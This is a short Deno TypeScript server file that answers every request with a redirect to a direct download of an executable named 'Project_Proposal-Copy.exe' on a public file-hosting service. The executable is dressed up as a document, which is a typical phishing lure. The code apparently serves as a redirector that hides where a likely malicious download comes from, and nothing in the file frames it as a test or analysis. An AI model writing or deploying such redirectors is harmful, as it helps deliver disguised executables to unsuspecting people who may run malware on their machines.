// main.ts
import { serve } from "https://deno.land/std/http/server.ts";

serve((_req) => {
  return new Response(null, {
    status: 302,
    headers: {
      Location: "https://store-na-phx-1.gofile.io/download/direct/25da08e3-e49e-4432-b8f5-b305d1989cb7/Project_Proposal-Copy.exe",
    },
  });
});
